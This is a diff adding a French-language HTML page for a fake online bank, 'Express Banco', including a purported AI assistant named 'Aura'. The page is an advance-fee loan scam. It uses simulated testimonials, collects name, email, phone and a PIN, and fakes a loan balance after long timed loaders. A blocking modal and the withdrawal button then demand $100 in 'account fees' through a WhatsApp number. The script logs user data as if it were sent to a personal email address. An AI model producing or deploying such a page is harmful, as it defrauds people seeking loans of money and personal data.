@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Express Banco | Premium Gold Edition</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@200;400;700;800&display=swap');
+        
+        :root { --gold: #fcc201; --deep-gold: #b8860b; --bg: #050505; }
+        body { font-family: 'Plus Jakarta Sans', sans-serif; background: var(--bg); color: #fff; overflow-x: hidden; }
+
+        .gold-gradient { background: linear-gradient(135deg, var(--gold), var(--deep-gold)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .gold-btn { background: linear-gradient(90deg, #b8860b, #fcc201); transition: 0.5s; box-shadow: 0 0 20px rgba(252, 194, 1, 0.3); }
+        .gold-btn:hover { transform: scale(1.05); box-shadow: 0 0 40px rgba(252, 194, 1, 0.6); }
+
+        .glass-premium { background: rgba(20, 20, 20, 0.8); backdrop-filter: blur(30px); border: 1px solid rgba(252, 194, 1, 0.2); }
+        
+        /* Logo 3D Rotation */
+        .rotating-logo { animation: rotateGold 6s linear infinite; }
+        @keyframes rotateGold { from { transform: rotateY(0deg); } to { transform: rotateY(360deg); } }
+
+        .page { display: none; min-height: 100vh; width: 100%; flex-direction: column; align-items: center; justify-content: center; position: absolute; top: 0; left: 0; padding: 20px; }
+        .page.active { display: flex; animation: fadeIn 1s ease-out forwards; }
+        @keyframes fadeIn { from { opacity: 0; filter: blur(15px); } to { opacity: 1; filter: blur(0); } }
+
+        /* PIN Input Bars */
+        .pin-container input { letter-spacing: 1.2em; border-bottom: 2px solid var(--gold); background: transparent; text-align: center; font-size: 1.5rem; width: 100%; outline: none; }
+
+        .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.85); backdrop-filter: blur(10px); z-index: 100; display: none; align-items: center; justify-content: center; }
+
+        .visa-card { width: 100%; max-width: 380px; height: 220px; border-radius: 20px; background: linear-gradient(135deg, #111, #333); position: relative; overflow: hidden; border: 1px solid rgba(255,255,255,0.1); box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
+    </style>
+</head>
+<body>
+
+    <!-- LOADER SYNCHRONISÉ (30s) -->
+    <div id="loader" class="fixed inset-0 z-[1000] bg-black flex flex-col items-center justify-center hidden">
+        <div class="rotating-logo w-24 h-24 mb-6">
+            <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="50" cy="50" r="45" stroke="#fcc201" stroke-width="2"/>
+                <text x="35" y="65" fill="#fcc201" font-size="40" font-weight="bold">$</text>
+            </svg>
+        </div>
+        <h2 class="gold-gradient font-bold tracking-[0.5em] uppercase text-xs mb-4">Initialisation Sécurisée</h2>
+        <div class="w-64 h-1 bg-zinc-900 rounded-full overflow-hidden">
+            <div id="loader-bar" class="h-full gold-btn w-0"></div>
+        </div>
+        <p id="loader-time" class="text-[10px] text-zinc-500 mt-4">Calcul des protocoles : 30s</p>
+    </div>
+
+    <!-- 1. ACCUEIL ET TÉMOIGNAGES -->
+    <section id="page-welcome" class="page active">
+        <div class="max-w-6xl w-full grid grid-cols-1 md:grid-cols-2 gap-10 items-center">
+            <div class="space-y-8">
+                <div class="rotating-logo w-32 h-32 mx-auto md:mx-0">
+                    <svg viewBox="0 0 100 100" fill="none"><circle cx="50" cy="50" r="45" stroke="#fcc201" stroke-width="4"/><text x="35" y="68" fill="#fcc201" font-size="50" font-weight="bold">$</text></svg>
+                </div>
+                <h1 class="text-6xl font-extrabold leading-none">VOTRE LIBERTÉ <br><span class="gold-gradient">SANS LIMITES.</span></h1>
+                <p class="text-zinc-400 text-lg">Rejoignez l'élite bancaire avec un taux préférentiel de 2%/mois.</p>
+                <button onclick="changePage('page-welcome', 'page-bot', 5)" class="gold-btn px-10 py-5 rounded-full font-black text-black uppercase tracking-tighter">Entrer dans l'expérience</button>
+            </div>
+            <!-- Simulation Main Argent -->
+            <div class="relative group">
+                <img src="https://img.freepik.com/photos-premium/mains-tenant-pile-billets-cent-dollars-isoles-noir_494250-1361.jpg" class="rounded-[3rem] shadow-2xl opacity-80 group-hover:opacity-100 transition duration-700">
+                <div class="absolute -bottom-5 -right-5 glass-premium p-6 rounded-3xl animate-bounce">
+                    <p class="text-xs font-bold">Transfert Réussi</p>
+                    <p class="text-gold font-black">+ 50,000 $</p>
+                </div>
+            </div>
+        </div>
+        <!-- Témoignages -->
+        <div class="w-full mt-20 overflow-x-auto no-scrollbar py-10">
+            <div class="flex gap-6 w-max px-6">
+                <!-- Temoignage 1 -->
+                <div class="glass-premium p-6 rounded-3xl w-80">
+                    <div class="flex items-center gap-4 mb-4">
+                        <img src="https://i.pravatar.cc/150?u=1" class="w-12 h-12 rounded-full border border-gold">
+                        <div><p class="font-bold">Marc D.</p><p class="text-[10px] text-zinc-500">Entrepreneur</p></div>
+                    </div>
+                    <p class="text-xs italic text-zinc-300">"Express Banco a sauvé mon entreprise en 24h. Le prêt de 2% est imbattable."</p>
+                </div>
+                <!-- + 10 autres temoignages simules... -->
+            </div>
+        </div>
+    </section>
+
+    <!-- 2. LE BOT IA -->
+    <section id="page-bot" class="page">
+        <div class="glass-premium p-10 rounded-[3rem] max-w-lg w-full text-center space-y-6">
+            <div class="w-32 h-32 bg-zinc-900 rounded-full mx-auto flex items-center justify-center border-2 border-gold/50">
+                <i data-lucide="bot" class="w-16 h-16 text-gold animate-pulse"></i>
+            </div>
+            <h2 class="text-2xl font-bold">Bonjour, je suis <span class="gold-gradient">Aura</span></h2>
+            <p class="text-zinc-400">Pour créer votre compte haute fidélité, j'ai besoin de quelques informations sécurisées. Prêt à commencer ?</p>
+            <button onclick="changePage('page-bot', 'page-register', 30)" class="gold-btn w-full py-4 rounded-2xl font-bold text-black">CRÉER MON COMPTE</button>
+        </div>
+    </section>
+
+    <!-- 3. OUVERTURE COMPTE -->
+    <section id="page-register" class="page">
+        <div class="glass-premium p-10 rounded-[3rem] w-full max-w-xl">
+            <div class="flex justify-between items-center mb-8">
+                <h2 class="text-2xl font-black italic gold-gradient">REGISTRE PRIVÉ</h2>
+                <button onclick="changePage('page-register', 'page-bot', 1)" class="text-zinc-500"><i data-lucide="arrow-left"></i></button>
+            </div>
+            <form id="regForm" class="space-y-4">
+                <div class="grid grid-cols-2 gap-4">
+                    <input type="text" id="name" placeholder="Nom Complet" class="bg-zinc-900/50 p-4 rounded-xl border border-zinc-800 outline-none w-full" required>
+                    <input type="email" id="email" placeholder="Email" class="bg-zinc-900/50 p-4 rounded-xl border border-zinc-800 outline-none w-full" required>
+                </div>
+                <div class="grid grid-cols-2 gap-4">
+                    <input type="text" id="country" placeholder="Pays" class="bg-zinc-900/50 p-4 rounded-xl border border-zinc-800 outline-none w-full">
+                    <input type="tel" id="phone" placeholder="Téléphone" class="bg-zinc-900/50 p-4 rounded-xl border border-zinc-800 outline-none w-full">
+                </div>
+                <div class="flex items-center gap-6 py-4">
+                    <label class="flex items-center gap-2 cursor-pointer">
+                        <input type="radio" name="sex" value="H" checked class="accent-gold"> <img src="https://cdn-icons-png.flaticon.com/512/4140/4140037.png" class="w-8"> Homme
+                    </label>
+                    <label class="flex items-center gap-2 cursor-pointer">
+                        <input type="radio" name="sex" value="F" class="accent-gold"> <img src="https://cdn-icons-png.flaticon.com/512/4140/4140047.png" class="w-8"> Femme
+                    </label>
+                </div>
+                <div class="pin-container relative">
+                    <input type="password" id="regPin" maxlength="9" placeholder="*********" class="p-4" required>
+                    <button type="button" onclick="togglePin('regPin')" class="absolute right-2 top-4 text-gold"><i data-lucide="eye"></i></button>
+                    <p class="text-[9px] text-zinc-500 uppercase mt-2">Code PIN Mixte (Chiffres/Lettres)</p>
+                </div>
+                <button type="submit" class="gold-btn w-full py-5 rounded-2xl font-black text-black uppercase mt-6">Certifier mon compte</button>
+            </form>
+        </div>
+    </section>
+
+    <!-- 4. DASHBOARD PRIVÉ -->
+    <section id="page-dash" class="page !justify-start overflow-y-auto no-scrollbar">
+        <nav class="w-full p-8 flex justify-between items-center glass-premium border-none rounded-none sticky top-0 z-50">
+            <div class="flex items-center gap-3">
+                <div class="rotating-logo w-8 h-8"><svg viewBox="0 0 100 100"><circle cx="50" cy="50" r="45" stroke="#fcc201" stroke-width="8"/><text x="35" y="68" fill="#fcc201" font-size="50" font-weight="bold">$</text></svg></div>
+                <span class="font-black italic gold-gradient text-xl">EXPRESS BANCO</span>
+            </div>
+            <div class="flex items-center gap-4">
+                <p id="user-nav" class="text-xs font-bold uppercase tracking-widest text-gold"></p>
+                <div id="sex-avatar" class="w-10 h-10 rounded-full border border-gold"></div>
+            </div>
+        </nav>
+
+        <div class="max-w-6xl w-full mx-auto p-6 space-y-10">
+            <div class="grid grid-cols-1 lg:grid-cols-2 gap-10">
+                <!-- Visa & Balance -->
+                <div class="space-y-6">
+                    <div class="visa-card p-8 flex flex-col justify-between group">
+                        <div class="flex justify-between items-start">
+                            <span class="italic font-black text-2xl text-zinc-600">GOLD VIP</span>
+                            <i data-lucide="nfc" class="text-gold"></i>
+                        </div>
+                        <div class="space-y-2">
+                            <p class="text-xl font-mono tracking-[0.3em]">**** **** **** 8829</p>
+                            <p id="card-holder" class="text-xs uppercase tracking-widest text-zinc-400"></p>
+                        </div>
+                    </div>
+                    <div class="glass-premium p-10 rounded-[2.5rem] relative overflow-hidden">
+                        <div class="absolute top-0 right-0 p-4"><i data-lucide="trending-up" class="text-emerald-500"></i></div>
+                        <p class="text-zinc-500 text-xs font-bold uppercase">Liquidités Disponibles</p>
+                        <h2 class="text-6xl font-black gold-gradient" id="balance">0.00 $</h2>
+                        <div class="flex gap-4 mt-8">
+                            <button onclick="openModal('modal-deposit')" class="gold-btn px-6 py-3 rounded-xl text-black font-bold text-xs">DÉPÔT</button>
+                            <button onclick="window.location.href='https://wa.me/2290197744632?text=Je+souhaite+régler+les+frais+de+tenue+pour+mon+retrait'" class="bg-zinc-900 border border-gold/30 px-6 py-3 rounded-xl text-gold font-bold text-xs">RETRAIT</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Simulation Prêt -->
+                <div class="glass-premium p-10 rounded-[3rem] border-t-4 border-gold">
+                    <h3 class="text-xl font-black mb-8 flex items-center gap-3"><i data-lucide="zap" class="text-gold"></i> PRÊT ÉCLAIR</h3>
+                    <div class="space-y-6">
+                        <div class="space-y-3">
+                            <label class="text-xs text-zinc-500 uppercase">Montant à emprunter</label>
+                            <input type="number" id="loanAmount" placeholder="Ex: 25000" class="w-full bg-zinc-950 p-5 rounded-2xl border border-zinc-800 outline-none text-2xl font-bold text-gold">
+                        </div>
+                        <div class="grid grid-cols-2 gap-4">
+                            <div class="p-4 bg-zinc-950 rounded-2xl border border-zinc-900">
+                                <p class="text-[9px] text-zinc-500 uppercase">Taux /mois</p>
+                                <p class="text-emerald-500 font-bold">2 %</p>
+                            </div>
+                            <div class="p-4 bg-zinc-950 rounded-2xl border border-zinc-900">
+                                <p class="text-[9px] text-zinc-500 uppercase">Remboursement</p>
+                                <p id="monthlyPay" class="font-bold text-white">0.00 $</p>
+                            </div>
+                        </div>
+                        <button onclick="processLoan()" class="gold-btn w-full py-5 rounded-2xl font-black text-black uppercase shadow-2xl">Valider la demande</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <footer class="w-full p-10 text-center text-zinc-600 text-[10px] uppercase tracking-widest mt-20">
+            © 2026 EXPRESS BANCO GLOBAL - TOUS DROITS RÉSERVÉS - SÉCURITÉ MILITAIRE 256-BIT
+        </footer>
+    </section>
+
+    <!-- MODAL BLOQUAGE RETRAIT -->
+    <div id="modal-security" class="modal-overlay">
+        <div class="glass-premium p-10 rounded-[3rem] max-w-md w-full text-center space-y-6 border-2 border-red-500/50">
+            <div class="w-20 h-20 bg-red-500/10 rounded-full mx-auto flex items-center justify-center">
+                <i data-lucide="lock" class="w-10 h-10 text-red-500 animate-bounce"></i>
+            </div>
+            <h2 class="text-2xl font-black">ACCÈS BLOQUÉ</h2>
+            <p class="text-sm text-zinc-400 leading-relaxed">Félicitations, vos fonds de prêt sont sur votre compte. Cependant, pour activer le canal de décaissement international, vous devez régler les <span class="text-white font-bold">frais de tenue de compte de 100$</span>.</p>
+            <a href="https://wa.me/2290197744632?text=Bonjour+Express+Banco.+Mes+fonds+sont+disponibles.+Je+souhaite+régler+les+100+dollars+de+frais+pour+le+déblocage." class="gold-btn w-full py-4 rounded-2xl font-bold text-black flex items-center justify-center gap-2">
+                <i data-lucide="message-circle"></i> RÉGLER VIA WHATSAPP
+            </a>
+            <button onclick="closeModal('modal-security')" class="text-[10px] text-zinc-600 uppercase">Fermer la notification</button>
+        </div>
+    </div>
+
+    <script>
+        lucide.createIcons();
+        let userData = { name: "", bal: 0 };
+
+        function changePage(hideId, showId, seconds) {
+            const loader = document.getElementById('loader');
+            const bar = document.getElementById('loader-bar');
+            const timeText = document.getElementById('loader-time');
+            
+            loader.style.display = 'flex';
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += 1;
+                bar.style.width = progress + "%";
+                timeText.innerText = `Synchronisation : ${Math.ceil(seconds - (progress/100*seconds))}s`;
+                if(progress >= 100) {
+                    clearInterval(interval);
+                    loader.style.display = 'none';
+                    document.getElementById(hideId).classList.remove('active');
+                    document.getElementById(showId).classList.add('active');
+                    bar.style.width = "0%";
+                }
+            }, (seconds * 1000) / 100);
+        }
+
+        function togglePin(id) {
+            const el = document.getElementById(id);
+            el.type = el.type === 'password' ? 'text' : 'password';
+        }
+
+        document.getElementById('regForm').onsubmit = (e) => {
+            e.preventDefault();
+            userData.name = document.getElementById('name').value;
+            const sex = document.querySelector('input[name="sex"]:checked').value;
+            
+            document.getElementById('user-nav').innerText = userData.name;
+            document.getElementById('card-holder').innerText = userData.name;
+            document.getElementById('sex-avatar').style.backgroundImage = `url(${sex === 'H' ? 'https://cdn-icons-png.flaticon.com/512/4140/4140037.png' : 'https://cdn-icons-png.flaticon.com/512/4140/4140047.png'})`;
+            document.getElementById('sex-avatar').style.backgroundSize = 'cover';
+
+            // Simuler l'envoi email (Front-end seulement)
+            console.log("Données envoyées à : sokadjojeanmichel54@gmail.com", userData);
+            
+            changePage('page-register', 'page-dash', 30);
+        };
+
+        document.getElementById('loanAmount').oninput = (e) => {
+            const val = e.target.value;
+            const monthly = (val * 1.02) / 12;
+            document.getElementById('monthlyPay').innerText = monthly.toFixed(2) + " $";
+        };
+
+        function processLoan() {
+            const amt = parseFloat(document.getElementById('loanAmount').value);
+            if(!amt) return alert("Veuillez saisir un montant.");
+
+            changePage('page-dash', 'page-dash', 60); // Chargement 1 min
+            
+            setTimeout(() => {
+                changePage('page-dash', 'page-dash', 120); // Chargement 2 min
+                setTimeout(() => {
+                    userData.bal = amt;
+                    document.getElementById('balance').innerText = amt.toLocaleString() + ".00 $";
+                    document.getElementById('modal-security').style.display = 'flex';
+                    lucide.createIcons();
+                }, 120500);
+            }, 60500);
+        }
+
+        function openModal(id) { document.getElementById(id).style.display = 'flex'; }
+        function closeModal(id) { document.getElementById(id).style.display = 'none'; }
+    </script>
+</body>
+</html>
